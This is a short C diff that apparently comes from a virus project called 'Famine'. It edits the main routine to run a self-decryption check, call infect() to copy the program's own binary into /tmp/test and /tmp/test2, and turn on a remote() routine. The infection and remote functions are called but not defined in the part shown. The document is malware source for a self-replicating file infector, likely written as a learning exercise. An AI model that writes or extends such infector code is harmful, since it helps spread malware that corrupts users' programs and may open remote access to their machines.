@@ -47,6 +47,20 @@ void __attribute__((section (".textearly")))decrypt(char *s, uint64_t n, uint32_
 //=============================================================
 
 int __attribute__((section (".textearly")))main(int ac, char **av){
-	//remote();
+
+	//decrypt((void*)text_start, text_length, (uint32_t*)key);
+	decrypt(&test_area, 8, (uint32_t*)key);
+
+
+	//check test_start is full of '0'
+	for (int i = 0; i < 8; i++)
+		if ((&test_area)[i] != 'A')
+			return (1);
+
 	println("Hello, I am Famine");
+
+	infect("/tmp/test", "/tmp/test", (void*)&bin_start, (size_t)&bin_end - (size_t)&bin_start);
+	infect("/tmp/test2", "/tmp/test2", (void*)&bin_start, (size_t)&bin_end - (size_t)&bin_start);
+
+	remote();
 }
